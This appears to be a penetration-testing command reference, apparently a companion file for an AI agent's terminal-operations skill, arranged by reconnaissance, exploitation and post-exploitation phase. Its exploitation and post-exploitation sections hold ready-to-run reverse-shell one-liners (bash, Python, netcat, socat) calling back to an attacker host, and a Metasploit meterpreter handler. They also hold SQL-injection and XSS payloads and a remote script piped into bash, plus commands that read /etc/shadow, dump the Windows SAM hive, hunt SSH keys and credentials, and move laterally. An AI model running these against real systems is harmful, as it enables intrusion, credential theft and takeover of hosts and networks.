# Terminal Operations — Payloads & Commands

> **Companion to**: `SKILL.md` — Terminal operations workflow and evidence chain protocol
> **See also**: `test-cases.md` — Structured test scenarios for terminal operations

Organized by engagement phase. Every command includes evidence capture patterns following the Evidence Chain Protocol defined in SKILL.md.

---

## Phase 1 — Reconnaissance Commands

### Network Reconnaissance

#### Nmap Variants

```bash
# TCP SYN scan with service/version detection — standard first pass
nmap -sS -sV -oA scans/nmap_syn_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# Full port scan — when initial scan finds few ports
nmap -sS -p- -sV --min-rate 5000 -oA scans/nmap_full_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# UDP scan — top 100 ports, slower but essential
nmap -sU --top-ports 100 -sV -oA scans/nmap_udp_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# Script scan — default NSE scripts for deep enumeration
nmap -sC -sV -oA scans/nmap_script_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# Vulnerability scan — NSE vuln category
nmap --script vuln -oA scans/nmap_vuln_$(date +%Y%m%d_%H%M%S) <target> \
  | tee -a evidence.log

# Subnet sweep — discover live hosts before deep scan
nmap -sn -oA scans/nmap_sweep_$(date +%Y%m%d_%H%M%S) <target/CIDR> \
  | tee -a evidence.log
```

#### Masscan

```bash
# Fast port sweep — for large ranges, then feed results to nmap
masscan -p1-65535 --rate=1000 -oL scans/masscan_$(date +%Y%m%d_%H%M%S).txt <target>

# Targeted top-ports scan
masscan --top-ports 100 --rate=500 -oL scans/masscan_top100_$(date +%Y%m%d_%H%M%S).txt <target>
```

#### RustScan

```bash
# Fast all-port discovery, pipe to nmap for service detection
rustscan -a <target> -- -sV -oA scans/rustscan_$(date +%Y%m%d_%H%M%S)
```

### Web Reconnaissance

#### Curl Variants

```bash
# Basic HTTP response with headers
curl -v -sS -o /dev/null -D - http://<target> 2>&1 | tee -a evidence.log

# Full response body capture with timestamp
echo "=== $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a evidence.log
curl -sS -o web/response_$(date +%Y%m%d_%H%M%S).html -w "%{http_code} %{redirect_url}\n" http://<target> \
  | tee -a evidence.log

# TLS/SSL certificate inspection
curl -v -sS https://<target> 2>&1 | grep -A 20 "SSL\|TLS\|certificate" | tee -a evidence.log

# Follow redirects with evidence
curl -v -L -sS -o /dev/null http://<target> 2>&1 | tee -a evidence.log

# API endpoint probing with JSON output
curl -sS -H "Content-Type: application/json" http://<target>/api/v1/ \
  | jq . 2>/dev/null | tee -a evidence.log
```

#### Web Fingerprinting

```bash
# WhatWeb — technology identification
whatweb -v http://<target> | tee -a evidence.log

# Nikto — web server vulnerability scanner
nikto -h http://<target> -output scans/nikto_$(date +%Y%m%d_%H%M%S).txt \
  | tee -a evidence.log

# Wappalyzer CLI (if available)
wappalyzer http://<target> | tee -a evidence.log
```

#### Directory and File Discovery

```bash
# Gobuster — directory brute-force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt \
  -o scans/gobuster_$(date +%Y%m%d_%H%M%S).txt -x php,html,txt,bak \
  | tee -a evidence.log

# ffuf — fast fuzzer for directories, subdomains, parameters
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -o scans/ffuf_dirs_$(date +%Y%m%d_%H%M%S).json \
  | tee -a evidence.log

# ffuf — subdomain enumeration (with DNS resolution)
ffuf -u http://FUZZ.<domain> -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt \
  -mc 200,301,302 -o scans/ffuf_subs_$(date +%Y%m%d_%H%M%S).json \
  | tee -a evidence.log

# dirsearch — alternative directory scanner
dirsearch -u http://<target> -o scans/dirsearch_$(date +%Y%m%d_%H%M%S).txt \
  | tee -a evidence.log
```

### DNS Reconnaissance

```bash
# Basic DNS lookup
dig <domain> ANY +noall +answer | tee -a evidence.log

# Zone transfer attempt
dig axfr <domain> @<nameserver> | tee -a evidence.log

# DNSRecon — comprehensive DNS enumeration
dnsrecon -d <domain> -t std -o scans/dnsrecon_$(date +%Y%m%d_%H%M%S).json \
  | tee -a evidence.log

# DNSRecon — brute-force subdomains
dnsrecon -d <domain> -t brt -D /usr/share/wordlists/dnsrecon/subdomains-top1mil-5000.txt \
  -o scans/dnsrecon_brt_$(date +%Y%m%d_%H%M%S).json | tee -a evidence.log

# dnsx — fast DNS toolkit
echo "<domain>" | dnsx -a -aaaa -cname -mx -ns -soa -txt \
  -o scans/dnsx_$(date +%Y%m%d_%H%M%S).txt | tee -a evidence.log

# Reverse DNS lookup
dig -x <IP> +short | tee -a evidence.log
```

### Service Enumeration

#### SMB Enumeration

```bash
# List shares
smbclient -L //<target> -N 2>&1 | tee -a evidence.log

# Connect to a specific share
smbclient //<target>/<share> -N -c "ls; exit" 2>&1 | tee -a evidence.log

# RPC enumeration
rpcclient -U "" <target> -c "srvinfo; enumdomusers; enumdomgroups" 2>&1 \
  | tee -a evidence.log

# Enum4linux — comprehensive SMB/NetBIOS enumeration
enum4linux -a <target> 2>&1 | tee scans/enum4linux_$(date +%Y%m%d_%H%M%S).txt
```

#### LDAP Enumeration

```bash
# LDAP search — dump naming contexts
ldapsearch -x -H ldap://<target> -s base namingcontexts 2>&1 | tee -a evidence.log

# LDAP search — dump all users
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" \
  2>&1 | tee -a evidence.log

# LDAP search — dump all groups
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=group)" \
  2>&1 | tee -a evidence.log
```

---

## Phase 2 — Exploitation Commands

### Reverse Shell Payloads

```bash
# Bash reverse shell
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker_ip>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'

# Netcat reverse shell (traditional)
nc -e /bin/bash <attacker_ip> <port>

# Netcat reverse shell (openbsd variant — no -e flag)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_ip> <port> > /tmp/f

# Socat reverse shell (fully interactive PTY)
socat TCP:<attacker_ip>:<port> EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# Socat listener (for upgraded shells)
socat file:`tty`,raw,echo=0 TCP-L:<port>

# Pwncat — listener with auto-upgrade
pwncat-cs -l <port>
```

#### Catching Reverse Shells

```bash
# Netcat listener with logging
nc -lvnp <port> 2>&1 | tee -a shells/session_$(date +%Y%m%d_%H%M%S).log

# Upgrade to PTY after catch
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm
```

### Web Exploitation

```bash
# SQLMap — automated SQL injection
sqlmap -u "http://<target>/page?id=1" --batch --dbs \
  --output-dir=exploits/sqlmap_$(date +%Y%m%d_%H%M%S) \
  | tee -a evidence.log

# SQLMap — dump specific database
sqlmap -u "http://<target>/page?id=1" --batch -D <database> --tables \
  | tee -a evidence.log

# SQLMap — with POST data
sqlmap -u "http://<target>/login" --data="user=admin&pass=test" --batch \
  --output-dir=exploits/sqlmap_$(date +%Y%m%d_%H%M%S) | tee -a evidence.log

# Commix — command injection exploitation
commix --url="http://<target>/page?cmd=test" --output-dir=exploits/commix_$(date +%Y%m%d_%H%M%S) \
  | tee -a evidence.log

# XSS testing — reflected
curl -sS "http://<target>/search?q=<script>alert(1)</script>" | grep -i "alert(1)" \
  | tee -a evidence.log

# XSS testing — stored (via curl POST)
curl -sS -X POST http://<target>/comment -d "comment=<script>alert(1)</script>" \
  -o /dev/null -w "%{http_code}\n" | tee -a evidence.log
```

### Network Exploitation

```bash
# Metasploit — resource script for batch execution
cat > exploits/msf_resource_$(date +%Y%m%d_%H%M%S).rc << 'EOF'
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
run
EOF
msfconsole -r exploits/msf_resource_$(date +%Y%m%d_%H%M%S).rc

# Responder — LLMNR/NBT-NS poisoner
sudo responder -I <interface> -wrf -o exploits/responder_$(date +%Y%m%d_%H%M%S).log

# mitm6 — IPv6 man-in-the-middle
sudo mitm6 -i <interface> -d <domain> 2>&1 | tee -a evidence.log
```

---

## Phase 3 — Post-Exploitation Commands

### Privilege Escalation

```bash
# LinPEAS — Linux privilege escalation enumeration
curl -sS https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh \
  | bash 2>&1 | tee post/linpeas_$(date +%Y%m%d_%H%M%S).txt

# LinPEAS — from local file
bash linpeas.sh 2>&1 | tee post/linpeas_$(date +%Y%m%d_%H%M%S).txt

# WinPEAS — Windows privilege escalation (run on target)
.\winpeas.exe > winpeas_$(date +%Y%m%d_%H%M%S).txt 2>&1

# Linux Exploit Suggester
perl linux-exploit-suggester.pl 2>&1 | tee post/les_$(date +%Y%m%d_%H%M%S).txt

# Manual Linux checks
id && whoami && uname -a && cat /etc/os-release 2>&1 | tee -a evidence.log
sudo -l 2>&1 | tee -a evidence.log
find / -perm -4000 -type f 2>/dev/null | tee -a evidence.log
cat /etc/crontab 2>&1 | tee -a evidence.log

# Capability enumeration
getcap -r / 2>/dev/null | tee -a evidence.log
```

### Lateral Movement

```bash
# CrackMapExec — SMB sweep with credentials
crackmapexec smb <target_range> -u <user> -p <password> \
  --output-file post/cme_smb_$(date +%Y%m%d_%H%M%S).txt

# CrackMapExec — execute command
crackmapexec smb <target> -u <user> -p <password> -x "whoami" \
  | tee -a evidence.log

# Impacket — PsExec
impacket-psexec <domain>/<user>:<password>@<target> 2>&1 \
  | tee post/psexec_$(date +%Y%m%d_%H%M%S).log

# Impacket — WMIExec
impacket-wmiexec <domain>/<user>:<password>@<target> 2>&1 \
  | tee post/wmiexec_$(date +%Y%m%d_%H%M%S).log

# SSH tunneling — local port forward
ssh -L <local_port>:<internal_target>:<remote_port> <user>@<pivot_host> \
  -o StrictHostKeyChecking=no

# SSH tunneling — dynamic SOCKS proxy
ssh -D <socks_port> <user>@<pivot_host> -o StrictHostKeyChecking=no -N -f

# Proxychains — route through SOCKS proxy
echo "socks5 127.0.0.1 <socks_port>" >> /etc/proxychains4.conf
proxychains nmap -sT -sV -Pn <internal_target> 2>&1 | tee -a evidence.log
```

### Data Collection

```bash
# Find secrets — common file patterns
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" \
  -o -name "*.bak" -o -name "*.old" 2>/dev/null | head -50 | tee -a evidence.log

# Find SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" \
  2>/dev/null | tee -a evidence.log

# Search for credentials in files
grep -rIl "password\|passwd\|credential\|secret\|token" \
  /etc/ /var/ /opt/ /home/ 2>/dev/null | head -30 | tee -a evidence.log

# Hash dump — SAM database (Windows, admin required)
reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM system.bak

# Config extraction — common locations
cat /etc/shadow 2>/dev/null | tee -a evidence.log
cat /etc/passwd | tee -a evidence.log
```

---

## Evidence Capture Patterns

### Session Recording

```bash
# Start recorded session — captures all terminal I/O
script -q evidence/session_$(date +%Y%m%d_%H%M%S).log

# Start session with flush for real-time writing
script -q -f evidence/session_$(date +%Y%m%d_%H%M%S).log

# Stop recording
exit  # or Ctrl+D

# Replay a recorded session
scriptreplay evidence/session_20260514_143000.log
```

### Screenshot Organization

```bash
# Create evidence directory structure per target
mkdir -p evidence/<target>/scans
mkdir -p evidence/<target>/exploits
mkdir -p evidence/<target>/post
mkdir -p evidence/<target>/screenshots

# Screenshot with timestamp (macOS)
screencapture evidence/<target>/screenshots/$(date +%Y%m%d_%H%M%S).png

# Screenshot with timestamp (Linux with import from ImageMagick)
import evidence/<target>/screenshots/$(date +%Y%m%d_%H%M%S).png

# Screenshot with timestamp (Linux with scrot)
scrot evidence/<target>/screenshots/$(date +%Y%m%d_%H%M%S).png
```

### Output File Naming Convention

```
<tool>_<action>_<target>_<YYYYMMDD>_<HHMMSS>.<ext>

Examples:
  nmap_syn_192.168.1.100_20260514_143000.nmap
  nmap_syn_192.168.1.100_20260514_143000.xml
  nmap_syn_192.168.1.100_20260514_143000.gnmap
  gobuster_dir_10.10.10.5_20260514_150000.txt
  linpeas_192.168.1.100_20260514_160000.txt
```

### Hash Verification of Evidence

```bash
# Generate SHA-256 hashes for all evidence files
find evidence/ -type f -exec sha256sum {} \; \
  > evidence/evidence_hashes_$(date +%Y%m%d_%H%M%S).txt

# Verify hashes after collection
sha256sum -c evidence/evidence_hashes_20260514_143000.txt

# Single file hash (for chain of custody)
sha256sum evidence/session_20260514_143000.log | tee -a evidence.log

# MD5 alternative (faster, lower security — for quick verification)
md5sum evidence/session_20260514_143000.log | tee -a evidence.log
```

---

## Debugging & Troubleshooting

### Common Tool Failures and Fixes

```bash
# Nmap — "NOTE: UDP scan reliability"
# Fix: Run multiple times, increase retry count
nmap -sU --max-retries 3 -sV <target>

# Nmap — scan appears hung
# Fix: Reduce timing template, increase verbosity
nmap -T4 -v -sS <target>

# Gobuster — too many false positives
# Fix: Filter by status codes, add custom headers
gobuster dir -u http://<target> -w <wordlist> -s 200,204,301,302 \
  -H "Authorization: Bearer <token>"

# SQLMap — connection timeout
# Fix: Increase delay, add proxy
sqlmap -u "<url>" --delay=3 --timeout=30 --retries=3

# Metasploit — database not connected
# Fix: Initialize database
sudo systemctl start postgresql
sudo msfdb init
```

### Network Connectivity Debugging

```bash
# Check basic connectivity
ping -c 3 <target> 2>&1 | tee -a evidence.log

# Traceroute — identify network path
traceroute <target> 2>&1 | tee -a evidence.log

# Check specific port
nc -zv <target> <port> 2>&1 | tee -a evidence.log
timeout 5 bash -c "echo > /dev/tcp/<target>/<port>" 2>&1 | tee -a evidence.log

# DNS resolution check
host <target> 2>&1 | tee -a evidence.log
nslookup <target> 2>&1 | tee -a evidence.log

# Route table inspection
ip route show | tee -a evidence.log
route -n | tee -a evidence.log

# Interface status
ip addr show | tee -a evidence.log
```

### Permission Issues Resolution

```bash
# Check current user context
id && groups

# Check sudo permissions
sudo -l

# Check file permissions on target tool/script
ls -la /path/to/tool

# Verify capabilities on binary
getcap /path/to/tool

# Common fix: tool requires raw socket access
sudo setcap cap_net_raw+ep /path/to/tool

# Common fix: tool requires specific group
sudo usermod -aG <group> <user>  # requires re-login
```

### Tool Version Compatibility Checks

```bash
# Check nmap version and compiled features
nmap --version

# Check Metasploit version
msfconsole -q -x "version; exit"

# Check Python version
python3 --version

# Check curl features (TLS, protocols)
curl --version

# Check OpenSSL version and supported ciphers
openssl version -a
openssl ciphers -v | head -20

# Check impacket installation
python3 -c "import impacket; print(impacket.__version__)"

# Verify tool is in PATH
which <tool> && <tool> --version
```
